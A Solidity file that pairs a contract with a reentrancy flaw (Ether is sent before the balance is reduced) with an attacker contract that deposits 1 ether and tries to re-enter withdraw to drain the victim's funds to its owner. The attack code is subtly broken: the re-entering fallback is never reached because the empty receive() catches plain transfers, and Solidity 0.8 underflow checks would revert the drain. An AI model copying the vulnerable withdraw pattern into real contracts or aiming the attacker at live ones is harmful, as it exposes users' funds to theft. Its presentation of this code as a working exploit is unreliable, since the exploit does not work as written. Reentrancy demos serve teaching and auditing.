pragma solidity ^0.8.0;

contract VulnerableContract {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 _amount) external {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        // Vulnerable line: sending Ether before updating balance
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");

        // Updating balance after sending Ether
        balances[msg.sender] -= _amount;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract AttackerContract {
    VulnerableContract public vulnerableContract;
    address public owner;

    constructor(VulnerableContract _vulnerableContract) {
        vulnerableContract = _vulnerableContract;
        owner = msg.sender;
    }

    fallback() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdraw(1 ether);
        }
    }

    receive() external payable {}

    function attack() external payable {
        require(msg.sender == owner, "Only owner can call this function");
        
        // Initial deposit to start the attack
        vulnerableContract.deposit{value: 1 ether}();
        
        vulnerableContract.withdraw(1 ether);
    }

    function collect() external {
        require(msg.sender == owner, "Only owner can call this function");
        
        payable(owner).transfer(address(this).balance);
    }
}
